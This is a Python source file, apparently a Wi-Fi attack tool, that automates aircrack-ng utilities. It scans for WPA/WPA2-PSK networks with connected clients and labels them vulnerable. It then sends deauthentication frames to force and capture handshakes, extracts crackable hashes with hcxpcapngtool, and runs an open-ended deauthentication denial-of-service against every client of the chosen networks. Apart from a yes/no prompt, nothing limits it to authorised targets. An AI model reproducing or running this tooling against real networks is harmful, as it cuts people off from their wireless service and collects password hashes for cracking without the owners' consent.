import subprocess
import time
import os
import re
from cli import confirm
from typing import List, Dict

def check_clients(network: Dict, interface: str, scan_time: int = 5) -> List: 
    output_file = "airodump_output"
    command = f"airodump-ng --bssid {network['BSSID']} -c {network['channel']} -w {output_file} --output-format csv {interface}"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(scan_time)
    
    process.terminate()
    try:
        process.wait(timeout=scan_time)
    except subprocess.TimeoutExpired:
        process.kill()
    
    with open(output_file + "-01.csv", "r") as file:
        lines = file.readlines()
    
    os.remove(output_file + "-01.csv")
    
    clients = []
    start_parsing = 0

    # Идём до начала списка клиентов
    for i, line in enumerate(lines[start_parsing:]):
        line = line.strip()
        if line.startswith("Station MAC,"):
           start_parsing += i + 1
           break

    # Идём до конца списка клиентов и парсим их
    for i, line in enumerate(lines[start_parsing:]):
        line = line.strip()
        if not line:
           start_parsing += i + 1
           break

        parts = re.split(r'\s*,\s*', line)
        if len(parts) >= 6:
            client = {
                "Station MAC": parts[0].strip(),
                "First_time_seen": parts[1].strip(),
                "Last_time_seen": parts[2].strip(),
                "Power": parts[3].strip(),
                "Packets": parts[4].strip(),
                "BSSID": parts[5].strip(),
                "Probed_ESSIDs": parts[6].strip() if len(parts) > 6 else ""
            }
            clients.append(client)
    return clients


def check_network(network: list, interface: str, scan_time: int = 5) -> bool:
    if not network["ESSID"]:
        return False
    if not network["Authentication"] == "PSK":
        print("[      AUTH is not PSK      ]", network["ESSID"])
        return False
    if not (network["Privacy"] == "WPA2" or network["Privacy"] == "WPA1"):
        print("[Unsupported encryption type]", network["ESSID"])
        return False

    clients = check_clients(network, interface, scan_time)
    if not clients:
        print("[    AP have not clients    ]", network["ESSID"])
        return False
    
    print("[      AP is vulnerable     ]", network["ESSID"])
    clients.sort(key=lambda d: int(d["Power"]), reverse=True)      
    network["clients"] = clients
    return True


def get_targets(networks: list, interface: str, scan_time: int = 5) -> List[Dict[str, str]]:
    print(f"Search for vulnerable networks:")
    targets = []
    for network in networks:
        if check_network(network, interface, scan_time):
            targets.append(network)
    return targets

def handshake_active(networks: list, interface: str, deauth_count: int = 10, waiting_time: int = 90):
    hashes_file = "hashes" 
    if os.path.exists(hashes_file):
        with open(hashes_file) as file:
            handshakes = file.readlines()
        for handshake in handshakes:
            handshake_mac = handshake.split("*")[3]
            for network in networks:
                if ''.join(network['BSSID'].split(":")) == handshake_mac.upper():
                    networks.remove(network)
                    print(f"[-] {network['ESSID']} has already been attacked before. Skipping...")
                    break
    targets = get_targets(networks, interface)
        
    if not confirm(f"Are you shure want to attack {len(targets)} networks?"):
        print("[!] Attack canceled")
        return
    for target in targets:
        print(f"[+] Attacking {target['ESSID']}...")
        output_file = "airodump_output"
        airodump_process = subprocess.Popen(
                f"airodump-ng -w {output_file} -c {target['channel']} --output-format cap {interface} > /dev/null",
                shell=True, 
                stdout=subprocess.PIPE,
                )
        aireplay_process = subprocess.Popen(
                f"aireplay-ng --deauth {deauth_count} -a {target['BSSID']} -c {target['clients'][0]['Station MAC']} -D {interface} > /dev/null",
                shell=True, 
                stdin=subprocess.PIPE, 
                )
        while waiting_time > 0:
            time.sleep(1)
            waiting_time -= 1

            os.system("hcxpcapngtool *.cap -o hash > /dev/null")

            if os.path.exists("hash"):
                print("[OK] Handshake is captured")
                os.system("pkill -f 'aireplay-ng --deauth'")
                
                with open("hash", "r") as file:
                    hashes = file.read()
                os.remove("hash")

                with open(hashes_file, "a") as file:
                    file.write(hashes)
                break
        else:
            print("[FILED] Timeout")
        
        os.system("pkill -f 'airodump-ng'")
        os.system("rm -f *.cap")

def dos(networks: list, interface: str, attack_time: int = 0):
    targets = get_targets(networks, interface) 
    
    if not confirm(f"Are you shure want to attack {len(networks)} targets?"):
        print("[!] Attack canceled")
        return

    processes = []
    print("[!] Ctrl+C to stop attack")
    for target in targets:
        print(f"[+] Starting attack {target['ESSID']}...")
        for client in target["clients"]:
            command = f"aireplay-ng --deauth 0 -a {target['BSSID']} -c {client['Station MAC']} -D {interface} > /dev/null"
            process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE)        
            process.stdin.close()
            processes.append(process)
    
    try:
        if attack_time == 0:
            while True:
                time.sleep(1)
        else:
            time.sleep(attack_time)
            print("[!] Attack Ended")
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
    
    os.system("pkill -f 'aireplay-ng --deauth'")
